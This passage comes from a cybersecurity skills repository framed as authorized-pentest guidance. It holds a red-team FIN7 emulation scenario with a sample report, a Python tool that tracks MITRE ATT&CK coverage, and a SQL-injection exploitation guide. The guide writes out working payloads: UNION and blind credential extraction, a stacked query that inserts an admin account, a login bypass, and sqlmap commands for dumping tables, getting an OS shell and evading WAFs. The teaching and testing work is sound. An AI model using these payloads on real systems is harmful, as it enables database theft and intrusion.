- **ATT&CK coverage mapping**: Create an ATT&CK Navigator heatmap showing which techniques were tested and whether they were detected, missed, or partially detected
- **Purple team sessions**: Conduct collaborative sessions where the red team reveals each technique step-by-step while the Blue Team identifies where detection should have occurred and writes new detection rules
- **Report**: Deliver a comprehensive report including the operation narrative, technique-by-technique analysis with detection status, and prioritized recommendations for improving detection and response

## Key Concepts

| Term | Definition |
|------|------------|
| **Adversary Emulation** | Simulating the specific TTPs of a known threat actor to test defenses against realistic threats relevant to the organization |
| **C2 (Command and Control)** | Infrastructure and communication channels used by the red team to remotely control implants deployed on compromised systems |
| **OPSEC** | Operational Security; practices employed by the red team to avoid detection by the defending team during the exercise |
| **Domain Fronting** | A technique for hiding C2 traffic behind legitimate CDN domains to evade network-based detection and domain blocking |
| **Purple Teaming** | Collaborative exercise where red and blue teams work together to improve detection by sharing attack techniques and defensive gaps |
| **White Cell** | The trusted agent or exercise control group that manages the exercise, handles deconfliction, and mediates between red and blue teams |
| **Implant** | Software deployed by the red team on compromised systems to maintain access, execute commands, and facilitate lateral movement |
| **MTTD/MTTR** | Mean Time to Detect / Mean Time to Respond; metrics measuring how long it takes the defending team to identify and contain threats |

## Tools & Systems

- **Cobalt Strike**: Commercial adversary simulation platform providing beacons, malleable C2 profiles, and post-exploitation capabilities
- **Sliver**: Open-source C2 framework supporting multiple protocols (mTLS, WireGuard, HTTP/S, DNS) with cross-platform implants
- **MITRE ATT&CK Navigator**: Tool for visualizing ATT&CK technique coverage, enabling comparison of planned vs. executed vs. detected techniques
- **Mythic**: Open-source C2 framework with a modular agent architecture and web-based operator interface

## Common Scenarios

### Scenario: Adversary Emulation of FIN7 Against a Retail Company

**Context**: A national retail chain wants to test its defenses against FIN7, a financially motivated threat group known for targeting retail and hospitality organizations with point-of-sale malware, phishing, and data exfiltration.

**Approach**:
1. Emulate FIN7 TTPs: spear-phishing with malicious document containing VBA macros that execute PowerShell
2. Initial access achieved through spear-phishing a marketing employee; macro drops Cobalt Strike beacon using rundll32 proxy execution
3. Internal reconnaissance with BloodHound reveals a path from the compromised user to a service account with access to the POS management server
4. Kerberoast the service account, crack the password, and move laterally to the POS management system
5. Demonstrate data access to cardholder data environment, staging simulated card data for exfiltration
6. Exfiltrate staged data over DNS C2 channel to simulate data theft
7. SOC detected the lateral movement at hour 47 but did not detect the initial phishing, macro execution, or Kerberoasting

**Pitfalls**:
- Operating too aggressively and getting detected immediately, providing no value for testing Blue Team's advanced detection capabilities
- Using exclusively custom tools instead of living-off-the-land techniques that real adversaries prefer
- Not recording detailed timestamps for every action, making post-exercise analysis and detection gap mapping impossible
- Failing to establish backup C2 channels, getting burned by a single detection, and losing access without completing objectives

## Output Format

```
## Red Team Exercise Report - FIN7 Adversary Emulation

### Exercise Summary
**Duration**: November 4-22, 2025 (15 business days)
**Objective**: Access cardholder data environment and demonstrate data exfiltration capability
**Outcome**: OBJECTIVE ACHIEVED - Red team accessed POS management system and staged cardholder data for exfiltration

### ATT&CK Technique Coverage
| Technique | ID | Status | Detected? | MTTD |
|-----------|----|--------|-----------|------|
| Spear-Phishing Attachment | T1566.001 | Executed | No | - |
| Visual Basic Macro | T1059.005 | Executed | No | - |
| Process Injection | T1055 | Executed | No | - |
| Kerberoasting | T1558.003 | Executed | No | - |
| Remote Desktop Protocol | T1021.001 | Executed | YES | 47h |
| Data Staged | T1074 | Executed | No | - |
| Exfiltration Over C2 | T1041 | Executed | No | - |

### Detection Summary
- **Techniques Executed**: 14
- **Techniques Detected**: 3 (21.4%)
- **Mean Time to Detect**: 47 hours (for detected techniques)
- **Mean Time to Respond**: 4 hours (from detection to containment)

### Priority Recommendations
1. Deploy email detonation sandboxing for macro-enabled document analysis
2. Implement Kerberoasting detection via Windows Event ID 4769 monitoring
3. Enhance PowerShell logging (Script Block Logging, Module Logging)
4. Deploy memory-scanning EDR capability to detect process injection
```

===== END FILE =====


===== FILE: skills/executing-red-team-exercise/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/executing-red-team-exercise/references/api-reference.md =====
# API Reference: Red Team Exercise Agent

## Dependencies

| Library | Version | Purpose |
|---------|---------|---------|
| requests | >=2.28 | Download MITRE ATT&CK STIX data |

## CLI Usage

```bash
python scripts/agent.py \
  --actor "APT29" \
  --target "Retail Corp" \
  --objectives "Access POS data" "Exfiltrate cardholder data" \
  --output redteam_plan.json
```

## Functions

### `load_attack_techniques(cache_file) -> dict`
Downloads or loads cached MITRE ATT&CK Enterprise STIX bundle from GitHub (`mitre/cti`).

### `get_actor_techniques(attack_data, actor_name) -> list`
Resolves intrusion-set by name, follows `uses` relationships to collect `attack-pattern` objects. Returns list of `{id, name, tactic}`.

### `build_operation_plan(actor_name, target, objectives, attack_data) -> RedTeamOperation`
Creates a full operation plan with technique list mapped from the emulated actor's known TTPs.

### `log_technique_execution(op, technique_id, detected, notes)`
Updates a technique's status to `executed`, records detection boolean and timestamp.

### `generate_detection_gap_report(op) -> dict`
Compares executed vs. detected techniques. Outputs detection rate and missed technique recommendations.

## Data Classes

### `TechniqueExecution`
- `technique_id`, `technique_name`, `tactic`, `timestamp`, `status`, `detected`, `detection_time`, `notes`

### `RedTeamOperation`
- `operation_name`, `target_org`, `emulated_actor`, `start_date`, `objectives`, `techniques`

## MITRE ATT&CK Data Source

- URL: `https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json`
- Format: STIX 2.0 bundle with `intrusion-set`, `attack-pattern`, and `relationship` objects
- Locally cached as `attack_enterprise.json` after first download

===== END FILE =====


===== FILE: skills/executing-red-team-exercise/scripts/agent.py =====
#!/usr/bin/env python3
# For authorized testing in lab/CTF environments only
"""Red team exercise planning and ATT&CK technique tracking agent."""

import argparse
import json
import logging
from datetime import datetime
from dataclasses import dataclass, field, asdict
from typing import List

try:
    import requests
except ImportError:
    import sys; sys.exit("requests is required: pip install requests")

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

MITRE_ATTACK_URL = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"


@dataclass
class TechniqueExecution:
    technique_id: str
    technique_name: str
    tactic: str
    timestamp: str = ""
    status: str = "planned"
    detected: bool = False
    detection_time: str = ""
    notes: str = ""


@dataclass
class RedTeamOperation:
    operation_name: str
    target_org: str
    emulated_actor: str
    start_date: str
    objectives: List[str] = field(default_factory=list)
    techniques: List[TechniqueExecution] = field(default_factory=list)


def load_attack_techniques(cache_file: str = "attack_enterprise.json") -> dict:
    """Load MITRE ATT&CK Enterprise techniques from local cache or upstream."""
    import os
    if os.path.exists(cache_file):
        with open(cache_file) as f:
            return json.load(f)
    logger.info("Downloading ATT&CK Enterprise data...")
    resp = requests.get(MITRE_ATTACK_URL, timeout=60)
    resp.raise_for_status()
    data = resp.json()
    with open(cache_file, "w") as f:
        json.dump(data, f)
    return data


def get_actor_techniques(attack_data: dict, actor_name: str) -> List[dict]:
    """Extract techniques used by a specific threat actor from ATT&CK data."""
    actor_id = None
    for obj in attack_data.get("objects", []):
        if obj.get("type") == "intrusion-set" and actor_name.lower() in obj.get("name", "").lower():
            actor_id = obj["id"]
            break

    if not actor_id:
        logger.warning("Actor '%s' not found in ATT&CK data", actor_name)
        return []

    technique_refs = set()
    for obj in attack_data.get("objects", []):
        if obj.get("type") == "relationship" and obj.get("source_ref") == actor_id:
            if obj.get("relationship_type") == "uses":
                technique_refs.add(obj["target_ref"])

    techniques = []
    for obj in attack_data.get("objects", []):
        if obj.get("id") in technique_refs and obj.get("type") == "attack-pattern":
            ext_refs = obj.get("external_references", [])
            tech_id = next((r["external_id"] for r in ext_refs if r.get("source_name") == "mitre-attack"), "")
            kill_chain = obj.get("kill_chain_phases", [{}])
            tactic = kill_chain[0].get("phase_name", "") if kill_chain else ""
            techniques.append({"id": tech_id, "name": obj["name"], "tactic": tactic})

    logger.info("Found %d techniques for actor '%s'", len(techniques), actor_name)
    return techniques


def build_operation_plan(actor_name: str, target: str, objectives: List[str],
                         attack_data: dict) -> RedTeamOperation:
    """Create a red team operation plan based on emulated threat actor TTPs."""
    techniques = get_actor_techniques(attack_data, actor_name)
    executions = [
        TechniqueExecution(
            technique_id=t["id"], technique_name=t["name"],
            tactic=t["tactic"], status="planned",
        )
        for t in techniques
    ]
    return RedTeamOperation(
        operation_name=f"{actor_name} Emulation - {target}",
        target_org=target, emulated_actor=actor_name,
        start_date=datetime.utcnow().isoformat(),
        objectives=objectives, techniques=executions,
    )


def log_technique_execution(op: RedTeamOperation, technique_id: str,
                             detected: bool = False, notes: str = "") -> None:
    """Mark a technique as executed and record detection status."""
    for tech in op.techniques:
        if tech.technique_id == technique_id:
            tech.status = "executed"
            tech.timestamp = datetime.utcnow().isoformat()
            tech.detected = detected
            if detected:
                tech.detection_time = datetime.utcnow().isoformat()
            tech.notes = notes
            logger.info("Technique %s executed (detected=%s)", technique_id, detected)
            return
    logger.warning("Technique %s not found in operation plan", technique_id)


def generate_detection_gap_report(op: RedTeamOperation) -> dict:
    """Produce a detection gap analysis comparing executed vs detected techniques."""
    executed = [t for t in op.techniques if t.status == "executed"]
    detected = [t for t in executed if t.detected]
    missed = [t for t in executed if not t.detected]

    return {
        "operation": op.operation_name,
        "emulated_actor": op.emulated_actor,
        "total_techniques_planned": len(op.techniques),
        "techniques_executed": len(executed),
        "techniques_detected": len(detected),
        "techniques_missed": len(missed),
        "detection_rate": f"{len(detected)/len(executed)*100:.1f}%" if executed else "N/A",
        "detected_list": [asdict(t) for t in detected],
        "missed_list": [asdict(t) for t in missed],
        "recommendations": [
            f"Improve detection for {t.technique_id} ({t.technique_name})"
            for t in missed
        ],
    }


def main():
    parser = argparse.ArgumentParser(description="Red Team Exercise Agent")
    parser.add_argument("--actor", required=True, help="Threat actor to emulate (e.g., APT29)")
    parser.add_argument("--target", required=True, help="Target organization name")
    parser.add_argument("--objectives", nargs="+", default=["Demonstrate domain compromise"])
    parser.add_argument("--output", default="redteam_plan.json")
    args = parser.parse_args()

    attack_data = load_attack_techniques()
    op = build_operation_plan(args.actor, args.target, args.objectives, attack_data)
    report = {
        "operation": asdict(op),
        "technique_count": len(op.techniques),
        "tactics_covered": list(set(t.tactic for t in op.techniques if t.tactic)),
    }
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Operation plan saved to %s", args.output)
    print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/exploiting-sql-injection-vulnerabilities/SKILL.md =====
---
name: exploiting-sql-injection-vulnerabilities
description: 'Identifies and exploits SQL injection vulnerabilities in web applications
  during authorized penetration tests using manual techniques and automated tools
  like sqlmap. The tester detects injection points through error-based, union-based,
  blind boolean, and time-based blind techniques across all major database engines
  (MySQL, PostgreSQL, MSSQL, Oracle) to demonstrate data extraction, authentication
  bypass, and potential remote code execution. Activates for requests involving SQL
  injection testing, SQLi exploitation, database security assessment, or injection
  vulnerability verification.

  '
domain: cybersecurity
subdomain: penetration-testing
tags:
- SQL-injection
- sqlmap
- database-security
- OWASP-A03
- injection-testing
version: 1.0.0
author: mahipal
license: Apache-2.0
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1595
- T1190
- T1059
- T1078
- T1055
---
# Exploiting SQL Injection Vulnerabilities

## When to Use

- Testing web application input parameters for SQL injection vulnerabilities during an authorized penetration test
- Validating that parameterized queries and input sanitization are properly implemented across all database interactions
- Demonstrating the business impact of a confirmed SQL injection vulnerability by extracting sensitive data
- Verifying that WAF rules and input validation controls effectively block SQL injection payloads
- Testing stored procedures, dynamic SQL, and ORM bypass scenarios in enterprise applications

**Do not use** against databases without written authorization, for extracting or exfiltrating actual customer data beyond what is needed for proof of concept, or against production databases where exploitation could corrupt data integrity.

## Prerequisites

- Written authorization specifying the target application and permissible level of exploitation (detection only vs. full exploitation)
- Burp Suite Professional configured as an intercepting proxy to capture and modify HTTP requests
- sqlmap installed with current version for automated detection and exploitation
- Knowledge of the target database engine (MySQL, PostgreSQL, MSSQL, Oracle) or ability to fingerprint it
- Test accounts at various privilege levels to test injection in authenticated contexts

## Workflow

### Step 1: Injection Point Discovery

Identify parameters that interact with the database:

- **Map all input vectors**: Catalog every parameter in URLs (GET), request bodies (POST), HTTP headers (Cookie, Referer, User-Agent, X-Forwarded-For), and JSON/XML API payloads
- **Error-based detection**: Inject a single quote (`'`) into each parameter and observe the response. SQL errors (e.g., "You have an error in your SQL syntax", "unterminated quoted string", "ORA-01756") confirm the parameter reaches the database unsanitized.
- **Boolean-based detection**: Inject `' AND 1=1--` (true condition) and `' AND 1=2--` (false condition). If the responses differ (different content length, different data returned, different HTTP status), the parameter is injectable.
- **Time-based detection**: Inject `'; WAITFOR DELAY '0:0:5'--` (MSSQL), `' AND SLEEP(5)--` (MySQL), or `'; SELECT pg_sleep(5)--` (PostgreSQL). A 5-second response delay confirms injection.
- **Out-of-band detection**: Use payloads that trigger DNS or HTTP requests to a Burp Collaborator domain to confirm injection in scenarios where responses are not directly observable.
- **Second-order injection**: Test for injection where input is stored and later used in a different SQL query (e.g., username stored at registration, used in a query on the profile page).

### Step 2: Database Fingerprinting

Determine the database engine and version to select appropriate exploitation techniques:

- **Error-based fingerprinting**: Each database produces distinctive error messages. MySQL includes "MySQL", MSSQL mentions "SQL Server", PostgreSQL references "PG", Oracle contains "ORA-".
- **Function-based fingerprinting**: Inject database-specific functions:
  - MySQL: `' AND VERSION()--` or `' AND @@version--`
  - MSSQL: `' AND @@version--` or `' AND DB_NAME()--`
  - PostgreSQL: `' AND version()--`
  - Oracle: `' AND banner FROM v$version--`
- **String concatenation differences**: MySQL uses `CONCAT('a','b')` or `'a' 'b'`, MSSQL uses `'a'+'b'`, PostgreSQL uses `'a'||'b'`, Oracle uses `'a'||'b'`
- **Comment syntax**: MySQL supports `#` and `-- `, MSSQL uses `-- `, PostgreSQL uses `-- `, Oracle uses `-- `

### Step 3: Manual Exploitation Techniques

Exploit confirmed injection points using technique-appropriate methods:

- **UNION-based extraction**: Determine the number of columns with `ORDER BY` incrementing (`' ORDER BY 1--`, `' ORDER BY 2--`, etc. until an error occurs). Then construct UNION SELECT to extract data:
  ```
  ' UNION SELECT NULL,username,password,NULL FROM users--
  ```
- **Error-based extraction** (MySQL): Use `EXTRACTVALUE` or `UPDATEXML` to force data into error messages:
  ```
  ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
  ```
- **Blind boolean extraction**: Extract data one character at a time by testing character values:
  ```
  ' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
  ```
- **Time-based blind extraction**: Same character-by-character approach using time delays:
  ```
  ' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)--
  ```
- **Stacked queries** (where supported): Execute additional SQL statements:
  ```
  '; INSERT INTO users(username,password,role) VALUES('attacker','password','admin')--
  ```

### Step 4: Automated Exploitation with sqlmap

Use sqlmap for efficient exploitation of confirmed injection points:

- **Basic detection**: `sqlmap -u "https://target.com/page?id=1" --batch --random-agent` to detect injection and identify the database
- **Extract databases**: `sqlmap -u "https://target.com/page?id=1" --dbs` to list all databases
- **Extract tables**: `sqlmap -u "https://target.com/page?id=1" -D <database> --tables` to list tables
- **Extract data**: `sqlmap -u "https://target.com/page?id=1" -D <database> -T users --dump --threads 5` to extract table contents
- **POST parameters**: `sqlmap -u "https://target.com/login" --data="username=test&password=test" -p username` to test POST parameters
- **Cookie injection**: `sqlmap -u "https://target.com/page" --cookie="session=abc123; id=1*" --level 2` to test cookie parameters (mark injectable parameter with *)
- **OS command execution** (if DB user has sufficient privileges): `sqlmap -u "https://target.com/page?id=1" --os-shell` to attempt command execution via xp_cmdshell (MSSQL) or INTO OUTFILE (MySQL)
- **Tamper scripts**: `sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between` to bypass WAF filters

### Step 5: Impact Demonstration and Reporting

Document the full impact of the SQL injection vulnerability:

- **Data extraction evidence**: Capture screenshots or sqlmap output showing extracted database names, table schemas, and sample records (redact actual PII in the report)
- **Authentication bypass**: Demonstrate login bypass with `admin' OR 1=1--` and document the bypassed authentication mechanism
- **Privilege escalation**: If the database user has DBA privileges, document what additional capabilities are available (file read/write, command execution)
- **Lateral movement potential**: Document if the database server has network access to other internal systems that could be reached through OS-level access gained via SQLi
- **Remediation**: Provide specific code-level fixes showing the vulnerable query and the corrected parameterized version

## Key Concepts

| Term | Definition |
|------|------------|
| **SQL Injection** | A code injection technique that exploits unvalidated user input in SQL queries to manipulate database operations, extract data, or execute administrative operations |
| **Union-Based SQLi** | Injection technique that appends a UNION SELECT statement to the original query to extract data from other tables in the same response |
| **Blind SQL Injection** | Injection where the application does not return query results directly; the attacker infers data through boolean responses or time delays |
| **Parameterized Query** | A prepared SQL statement where user input is passed as parameters rather than concatenated into the query string, preventing injection |
| **Second-Order Injection** | SQL injection where the malicious payload is stored by the application and executed in a different context or SQL query at a later time |
| **Stacked Queries** | Executing multiple SQL statements separated by semicolons in a single request, enabling INSERT, UPDATE, or DELETE operations through injection |
| **WAF Bypass** | Techniques for evading Web Application Firewall rules that block common SQL injection patterns, using encoding, alternate syntax, or fragmentation |

## Tools & Systems

- **sqlmap**: Automated SQL injection detection and exploitation tool supporting 6 injection techniques across 30+ database management systems
- **Burp Suite Professional**: HTTP proxy for intercepting, modifying, and replaying requests with SQL injection payloads across all parameter types
- **Havij**: GUI-based SQL injection tool used for rapid automated exploitation when sqlmap is not available
- **jSQL Injection**: Java-based SQL injection tool with GUI supporting automatic injection, database extraction, and file read/write

## Common Scenarios

### Scenario: SQL Injection in Healthcare Patient Portal

**Context**: A healthcare organization's patient portal allows patients to view their medical records, appointments, and billing information. The application uses a PHP backend with MySQL database. The tester has a valid patient account.

**Approach**:
1. Map all parameters in the patient portal; identify that the appointment detail page uses `/appointment?id=4521`
2. Inject a single quote into the id parameter; receive a MySQL error confirming the parameter is injectable
3. Use `ORDER BY` to determine the query returns 7 columns
4. Construct UNION SELECT to extract table names from information_schema, discovering tables: patients, medical_records, billing, admin_users
5. Extract admin_users table to reveal 5 administrator accounts with MD5-hashed passwords
6. Demonstrate that patient medical records for all patients are accessible by querying the medical_records table through the injection point
7. Document that 15,000+ patient records containing PHI (protected health information) are accessible, constituting a HIPAA violation

**Pitfalls**:
- Running sqlmap with default settings against a production database and causing excessive load or data corruption
- Extracting and storing actual patient data during the assessment rather than limiting proof to record counts and schema
- Not testing for second-order injection in stored procedures called by the application
- Failing to test all parameter types (cookies, headers, JSON body) and only testing URL parameters

## Output Format

```
## Finding: SQL Injection in Appointment Detail Parameter

**ID**: SQLI-001
**Severity**: Critical (CVSS 9.8)
**Affected URL**: GET /appointment?id=4521
**Parameter**: id (GET parameter)
**Database**: MySQL 8.0.32
**Injection Type**: Error-based, UNION-based

**Description**:
The appointment detail page concatenates the 'id' URL parameter directly into
a SQL query without parameterization or input validation. This allows an attacker
to inject arbitrary SQL statements and extract data from any table in the database.

**Proof of Concept**:
Request: GET /appointment?id=4521' UNION SELECT 1,username,password,4,5,6,7 FROM admin_users-- -
Response: Returns admin usernames and MD5 password hashes in the page content.

**Data Accessible**:
- patients table: 15,247 records (name, DOB, SSN, address, phone)
- medical_records table: 43,891 records (diagnoses, prescriptions, lab results)
- admin_users table: 5 accounts with MD5-hashed passwords
- billing table: 28,563 records (insurance details, payment information)

**Remediation**:
1. Replace string concatenation with parameterized queries:
   VULNERABLE:  $query = "SELECT * FROM appointments WHERE id = " . $_GET['id'];
   SECURE:      $stmt = $pdo->prepare("SELECT * FROM appointments WHERE id = ?");
                $stmt->execute([$_GET['id']]);
2. Implement input validation to reject non-integer values for the id parameter
3. Apply least-privilege database permissions (read-only for the web application user)
4. Deploy a WAF rule to detect and block SQL injection patterns as defense-in-depth
```

===== END FILE =====


===== FILE: skills/exploiting-sql-injection-vulnerabilities/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
